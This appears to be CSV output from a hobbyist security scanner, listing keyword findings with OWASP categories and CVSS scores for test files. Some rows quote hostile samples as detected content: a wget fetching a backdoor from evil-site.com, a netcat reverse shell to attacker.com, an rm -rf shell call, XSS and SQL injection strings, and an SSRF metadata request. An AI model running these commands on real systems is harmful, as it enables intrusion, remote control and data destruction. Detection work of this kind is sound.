Keyword,Severity,Confidence,OWASP,CVSS,Remediation,File,Line,Content
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6544,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6552,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6560,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6568,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6576,"""content"": ""\""content\"": \""INFO Contact admin@test.com immediately\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6605,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6613,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6621,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6629,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6637,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6645,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6653,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6661,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6669,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6677,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6685,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/vulnerability_history.json,6693,"""content"": ""\""content\"": \""INFO Request made to /api/users/profile\"""""
dangerous_file_type,HIGH,HIGH,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/payload.EXE,0,Dangerous file detected: payload.EXE
dangerous_file_type,HIGH,HIGH,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/invoice.pdf.EXE,0,Dangerous file detected: invoice.pdf.EXE
double_extension,HIGH,HIGH,A05: Security Misconfiguration,8.0,Block execution and inspect file.,/Users/davidionclarksr./python-projects/secure-scan/data/invoice.pdf.EXE,0,Suspicious double extension: invoice.pdf.EXE
suspicious_filename,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/invoice.pdf.EXE,0,Suspicious filename: invoice.pdf.EXE
xss,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,5,XSS payload detected: <script>alert(1)</script>
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,8,JWT token leaked: eyJhbGciOi
suspicious_filename,MEDIUM,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,0,Suspicious filename: urgent_payroll_password.txt
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,1,User logged in as admin
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,6,Broken access control: user accessed /admin without permission
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,2,Password found: password123
default_credentials,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,3,Default credentials detected: admin:admin
sql_injection_payload,UNKNOWN,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,4,SQL injection attempt: ' OR '1'='1
api_key_assignment,UNKNOWN,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,7,Sensitive data exposed: api_key=12345
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/urgent_payroll_password.txt,9,SSRF request to http://169.254.169.254/latest/meta-data
xss,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,6,ERROR XSS payload: <script>alert(1)</script>
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,10,admin password is secret
password,HIGH,MEDIUM,A02: Cryptographic Failures,8.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,19,WARN SQL attack detected: UNION SELECT password FROM users
xss,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,20,WARN IMG exploit: <img src=x onerror=alert(1)>
xss,HIGH,MEDIUM,A03: Injection,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,44,ERROR XSS payload: <script>alert(1)</script>
token,HIGH,MEDIUM,A02: Cryptographic Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,50,ALERT github_token found in config
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,34,WARN User attempt access to admin_panel
admin,MEDIUM,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,35,WARN Unauthorized access to admin_panel
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,1,INFO User login success user=alice ip=10.0.0.5
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,2,WARN Failed password attempt user=bob ip=10.0.0.9
sql_injection_payload,UNKNOWN,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,3,ERROR SQL injection attempt detected: ' OR 1=1 --
github_token,UNKNOWN,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,5,WARN admin token exposed: ghp_exampletoken
email,UNKNOWN,LOW,A02: Cryptographic Failures,3.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,8,INFO Contact admin@test.com immediately
api_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,9,INFO Request made to /api/users/profile
password_assignment,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,8.5,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,11,password=12345
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,12,INFO AWS key found: AKIA1234567890ABCDE
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,13,AWS key leaked: AKIA1234567890ABCDEF
ip_address,UNKNOWN,LOW,A05: Security Misconfiguration,2.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,14,INFO Suspicious login from 192.168.1.25
hardcore_login,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,15,"INFO username=""test_user"""
github_token,UNKNOWN,MEDIUM,A02: Cryptographic Failures,9.0,Remove token and rotate credentials.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,17,GitHub token leaked: ghp_abcdefghijklmnoprstuvwxyz123
sql_injection_payload,UNKNOWN,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,18,WARN Login attempt username=admin' OR 1=1 --
sql_injection_payload,UNKNOWN,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,21,WARN BODY exploit: <body onload=alert('xss')>
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,22,WARN Weak_password detected: password123
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,23,WARN Admin login using admin123
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,24,WARN Admin endpoint accessed: /admin/dashboard
debug_endpoint,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,25,WARN Debug endpoint exposed: /debug/config
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,27,WARN Shell execution detection: os.system(cmd)
download_activity,UNKNOWN,HIGH,A05: Security Misconfiguration,9.0,Validate download source and block malicious URLs.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,31,WARN wget http://evil-site.com/backdoor.sh
reverse_shell,UNKNOWN,HIGH,A03: Injection,10.0,Investigate for malware and isolate host.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,32,WARN nc -e /bin/sh attacker.com 4444
os_system_usage,UNKNOWN,MEDIUM,A05: Security Misconfiguration,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,33,"WARN Shell execution detected: os.system(""rm -rf"")"
admin_endpoint,UNKNOWN,MEDIUM,A01: Broken Access Control,5.0,Review finding and remediate appropriately.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,36,WARN admin_access attempt to /admin/users
sql_injection_payload,UNKNOWN,MEDIUM,A03: Injection,9.8,Use parameterized queries.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,37,ERROR XSS payload: javascript:alert('owned')
weak_password,UNKNOWN,MEDIUM,A07: Identification and Authentication Failures,6.5,Enforce strong password policies.,/Users/davidionclarksr./python-projects/secure-scan/data/sample_log.txt,38,ERROR User account using qwerty password
